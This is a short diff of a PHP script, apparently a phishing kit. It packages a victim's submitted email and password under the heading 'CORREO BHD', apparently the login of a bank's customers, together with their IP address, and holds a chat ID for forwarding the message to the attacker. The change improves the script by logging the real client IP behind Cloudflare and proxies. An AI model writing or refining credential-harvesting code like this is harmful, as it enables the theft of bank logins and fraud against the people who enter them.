@@ -8,7 +8,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $chatID = "8555745789"; // Reemplaza con tu chat ID
 
     // Obtén la IP del cliente
-    $ip = $_SERVER['REMOTE_ADDR'];
+    $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
 
     // Construye el mensaje
     $message = "=====CORREO BHD=======\n Correo: $email\n Clave: $cpass\nIP del cliente: $ip";
